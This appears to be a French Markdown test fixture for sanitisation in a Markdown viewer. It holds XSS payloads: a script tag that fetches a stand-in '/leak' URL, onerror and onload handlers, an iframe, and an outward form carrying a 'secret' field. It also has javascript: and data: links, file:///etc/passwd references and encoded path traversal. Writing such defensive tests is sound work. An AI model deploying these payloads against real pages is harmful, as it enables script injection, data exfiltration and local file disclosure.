# Le reste doit rester consultable

<script>window.__outilVizMdExecuted = true; fetch('https://example.invalid/leak')</script>
<img src="https://example.invalid/image.png" onerror="window.__outilVizMdExecuted=true">
<iframe src="https://example.invalid/"></iframe>
<svg onload="window.__outilVizMdExecuted=true"></svg>
<form action="https://example.invalid/"><input name="secret"></form>
<style>@import url(https://example.invalid/style.css); body { background:url(file:///etc/passwd) }</style>

[Exécutable](javascript:alert%281%29)
[Données](data:text/html;base64,PHNjcmlwdD4=)
[Fichier arbitraire](file:///etc/passwd)
[Commande](x-apple.systempreferences:)
![Image distante](https://example.invalid/image.png)
![Traversée](../../outside.png)
![Traversée encodée](%2e%2e/%2e%2e/outside.png)
![Double encodage](%252e%252e/outside.png)
![Vecteur](image.svg)

`<img onerror="...">` doit rester du texte.
